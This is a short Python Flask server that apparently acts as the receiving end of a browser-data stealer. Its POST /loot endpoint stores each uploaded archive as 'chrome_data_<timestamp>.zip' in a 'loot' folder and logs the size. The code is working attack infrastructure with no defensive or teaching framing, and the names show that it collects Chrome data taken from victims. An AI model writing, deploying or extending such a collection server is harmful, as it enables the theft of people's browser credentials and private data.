from flask import Flask, request, jsonify
import os
from datetime import datetime
import logging

app = Flask(__name__)

# Logging configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('server.log'),
        logging.StreamHandler()
    ]
)

LOOT_FOLDER = 'loot'
os.makedirs(LOOT_FOLDER, exist_ok=True)

@app.route('/loot', methods=['POST'])
def receive_loot():
    try:
        app.logger.info("POST request received at /loot")
        
        # Check if request has data
        if not request.data:
            app.logger.warning("Request without data")
            return jsonify({"status": "error", "message": "No data received"}), 400

        # Generate filename with timestamp
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"chrome_data_{timestamp}.zip"
        save_path = os.path.join(LOOT_FOLDER, filename)
        
        # Save the received file
        with open(save_path, 'wb') as f:
            f.write(request.data)
        
        # Check if the file was saved correctly
        if not os.path.exists(save_path) or os.path.getsize(save_path) == 0:
            app.logger.error("Failed to save received file")
            return jsonify({"status": "error", "message": "Failed to save file"}), 500
        
        app.logger.info(f"File received and saved as {filename} (Size: {os.path.getsize(save_path)} bytes)")
        return jsonify({
            "status": "success",
            "message": "File received",
            "filename": filename,
            "size": os.path.getsize(save_path)
        }), 200

    except Exception as e:
        app.logger.error(f"Error while processing upload: {str(e)}", exc_info=True)
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.logger.info("Starting Flask server on port 5000")
    app.run(host='0.0.0.0', port=5000, debug=True)
